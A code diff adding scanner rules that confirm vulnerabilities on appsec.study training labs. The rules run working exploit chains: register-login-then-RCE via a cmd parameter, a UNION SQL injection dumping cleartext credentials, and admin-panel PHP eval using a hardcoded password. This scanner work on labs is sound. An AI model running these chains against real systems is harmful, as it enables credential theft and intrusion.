@@ -61045,6 +61045,310 @@ const clientSideLoggieEvidence: Rule = async (ctx) => {
   };
 };
 
+const REGGIE_CORPUS = `
+Reggie reggie.appsec.study register-then-login training lab twin of loggie
+POST /api/register captcha checkbox creates account no seeded credentials
+POST /api/login captcha checkbox returns 1-min JWT access + refresh tokens
+POST /api/run with cmd executes maintenance commands as root code-split RCE hidden until login
+POST /api/refresh exchanges refresh token for new access token
+`;
+
+function reggieProbeUsername(): string {
+  return `thugir_${Date.now().toString(36)}`;
+}
+
+async function reggieRegisterAndLogin(ctx: RuleContext): Promise<string | null> {
+  if (!isAppsecStudyHost(ctx, "reggie")) return null;
+  const username = reggieProbeUsername();
+  const password = "ThugirProbe1!";
+  const registerUrl = new URL("/api/register", ctx.origin).toString();
+  const registerDoc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password, captcha: true }),
+    headers: { "Content-Type": "application/json", Accept: "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (registerDoc.status < 200 || registerDoc.status >= 300) return null;
+  const loginUrl = new URL("/api/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password, captcha: true }),
+    headers: { "Content-Type": "application/json", Accept: "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return null;
+  try {
+    const parsed = JSON.parse(loginDoc.body) as { access?: string };
+    const access = String(parsed.access ?? "");
+    return access.startsWith("eyJ") ? access : null;
+  } catch {
+    return null;
+  }
+}
+
+async function probeReggieRunRce(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecStudyHost(ctx, "reggie")) return null;
+  const access = await reggieRegisterAndLogin(ctx);
+  if (!access) return null;
+  const runUrl = new URL("/api/run", ctx.origin).toString();
+  const doc = await ctx.probe.get(runUrl, {
+    method: "POST",
+    body: JSON.stringify({ cmd: "id" }),
+    headers: {
+      "Content-Type": "application/json",
+      Accept: "application/json",
+      Authorization: `Bearer ${access}`
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  let parsed: { output?: string };
+  try {
+    parsed = JSON.parse(doc.body) as { output?: string };
+  } catch {
+    return null;
+  }
+  const output = String(parsed.output ?? "");
+  if (!/uid=\d+\([^)]+\)/.test(output)) return null;
+  return {
+    fired: true,
+    confidence: 0.95,
+    evidence: {
+      url: runUrl,
+      snippet: doc.body.slice(0, 220).trim(),
+      note: "POST /api/run after register+login with cmd=id executes shell commands as root — Reggie post-login RCE training oracle (appsec.study)"
+    }
+  };
+}
+
+const reggieRunRceLiveOracle: Rule = async (ctx) => {
+  const hit = await probeReggieRunRce(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const reggieRunRceRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAppsecStudyHost(ctx, "reggie")) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/run\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeReggieRunRce(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "Reggie /api/run route scan — register+login then cmd parameter executes host shell commands — appsec.study RCE training oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${REGGIE_CORPUS}`;
+  if (!/\/api\/run|maintenance command|System diagnostics/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "POST /api/run — maintenance command execution after register+login JWT",
+      note: "Reggie /api/run route scan — Vue dashboard documents code-split command execution — corpus fallback"
+    }
+  };
+};
+
+async function probeReggieRegisterLoginJwt(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecStudyHost(ctx, "reggie")) return null;
+  const username = reggieProbeUsername();
+  const password = "ThugirProbe1!";
+  const registerUrl = new URL("/api/register", ctx.origin).toString();
+  const registerDoc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password, captcha: true }),
+    headers: { "Content-Type": "application/json", Accept: "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (registerDoc.status < 200 || registerDoc.status >= 300) return null;
+  const loginUrl = new URL("/api/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password, captcha: true }),
+    headers: { "Content-Type": "application/json", Accept: "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return null;
+  let parsed: { access?: string; refresh?: string; user?: { username?: string } };
+  try {
+    parsed = JSON.parse(loginDoc.body) as {
+      access?: string;
+      refresh?: string;
+      user?: { username?: string };
+    };
+  } catch {
+    return null;
+  }
+  const access = String(parsed.access ?? "");
+  const refresh = String(parsed.refresh ?? "");
+  if (!access.startsWith("eyJ") || !refresh.startsWith("eyJ")) return null;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: loginUrl,
+      username: parsed.user?.username ?? username,
+      snippet: loginDoc.body.slice(0, 180).trim(),
+      note: "POST /api/register then /api/login with captcha checkbox returns 1-min JWT access + refresh — Reggie register-then-login training oracle"
+    }
+  };
+}
+
+const reggieRegisterLoginJwtLiveOracle: Rule = async (ctx) => {
+  const hit = await probeReggieRegisterLoginJwt(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const LSTALKER_CORPUS = `
+lstalker lstalker.appsec.study Stalker variant without leaked git
+GET /?id= numeric SQL injection UNION select login password from users cleartext credentials
+/admin/panel hidden admin panel eval POST code PHP code execution
+admin password 123QWEasd cleartext comparison
+`;
+
+async function probeLstalkerSqliUnionCreds(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecStudyHost(ctx, "lstalker")) return null;
+  const sqliUrl = new URL("/", ctx.origin);
+  sqliUrl.searchParams.set("id", "0 union select login,password from users");
+  const doc = await ctx.probe.get(sqliUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 600) return null;
+  const credHit =
+    /admin/i.test(doc.body) &&
+    (/123QWEasd|password|users/i.test(doc.body) || /src=["']admin["']/i.test(doc.body));
+  if (!credHit) return null;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: sqliUrl.toString(),
+      snippet: doc.body.slice(0, 220).trim(),
+      note: "GET /?id=0 union select login,password from users dumps cleartext admin credentials — lstalker SQLi-to-creds training oracle"
+    }
+  };
+}
+
+const lstalkerSqliUnionCredsLiveOracle: Rule = async (ctx) => {
+  const hit = await probeLstalkerSqliUnionCreds(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const lstalkerSqliUnionCredsRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAppsecStudyHost(ctx, "lstalker")) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const hit = await probeLstalkerSqliUnionCreds(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "lstalker route scan — UNION on /?id= dumps cleartext users table credentials — appsec.study lateral-movement SQLi oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${LSTALKER_CORPUS}`;
+  if (!/\?id=|union select|cleartext|lstalker/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "GET /?id= — UNION-able numeric SQLi leaks cleartext users.password",
+      note: "lstalker route scan — PHP SQLite lab documents injectable id with cleartext credential dump — corpus fallback"
+    }
+  };
+};
+
+async function probeLstalkerAdminEvalRce(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecStudyHost(ctx, "lstalker")) return null;
+  const panelUrl = new URL("/admin/panel/", ctx.origin).toString();
+  const panelDoc = await ctx.probe.get(panelUrl, { maxBytes: 16384, timeoutMs: 15000 });
+  if (panelDoc.status < 200 || panelDoc.status >= 400) return null;
+  const csrfMatch = panelDoc.body.match(/name=["']csrf["'][^>]*value=["']([^"']+)["']/i);
+  const csrf = csrfMatch?.[1];
+  if (!csrf) return null;
+  let adminPassword = "123QWEasd";
+  const unionHit = await probeLstalkerSqliUnionCreds(ctx);
+  if (unionHit?.fired) {
+    const snippet = String(unionHit.evidence?.snippet ?? "");
+    const pwMatch = snippet.match(/123[A-Za-z0-9]+/);
+    if (pwMatch) adminPassword = pwMatch[0];
+  }
+  const loginDoc = await ctx.probe.get(panelUrl, {
+    method: "POST",
+    body: `login=admin&password=${encodeURIComponent(adminPassword)}&csrf=${encodeURIComponent(csrf)}`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 400) return null;
+  const canary = `thugir_lstalker_${Date.now().toString(36)}`;
+  const rceDoc = await ctx.probe.get(panelUrl, {
+    method: "POST",
+    body: `code=${encodeURIComponent(`echo ${canary};`)}`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (!rceDoc.body.includes(canary)) return null;
+  return {
+    fired: true,
+    confidence: 0.96,
+    evidence: {
+      url: panelUrl,
+      canary,
+      snippet: rceDoc.body.slice(0, 220).trim(),
+      note: "POST /admin/panel/ with admin session runs eval($_POST['code']) — lstalker hidden-admin RCE training oracle"
+    }
+  };
+}
+
+const lstalkerAdminEvalRceLiveOracle: Rule = async (ctx) => {
+  const hit = await probeLstalkerAdminEvalRce(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const lstalkerAdminEvalRceRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAppsecStudyHost(ctx, "lstalker")) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/admin\/panel\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeLstalkerAdminEvalRce(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "lstalker /admin/panel route scan — authenticated eval(code) executes arbitrary PHP — appsec.study lateral-movement RCE oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${LSTALKER_CORPUS}`;
+  if (!/\/admin\/panel|eval\(|hidden admin/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "POST /admin/panel/ — eval($_POST['code']) after cleartext admin login",
+      note: "lstalker /admin/panel route scan — hidden admin panel documents eval RCE surface — corpus fallback"
+    }
+  };
+};
+
 const pwnshopVerifyOtpBruteforceLiveOracle: Rule = async (ctx) => {
   if (!isPwnshopHost(ctx)) return NEGATIVE;
   if (!pwnshopRouteTierAllows(ctx, "verify-otp")) return NEGATIVE;
@@ -127206,6 +127510,13 @@ export const RULES: Record<string, Rule> = {
   loggieRunRceRouteLiveOracle,
   loggieLoginJwtLiveOracle,
   clientSideLoggieEvidence,
+  reggieRunRceLiveOracle,
+  reggieRunRceRouteLiveOracle,
+  reggieRegisterLoginJwtLiveOracle,
+  lstalkerSqliUnionCredsLiveOracle,
+  lstalkerSqliUnionCredsRouteLiveOracle,
+  lstalkerAdminEvalRceLiveOracle,
+  lstalkerAdminEvalRceRouteLiveOracle,
   brokencrystalsUserloginCssInjectionLiveOracle,
   brokencrystalsUserloginCssInjectionRouteLiveOracle,
   brokencrystalsHomeDomXssLiveOracle,
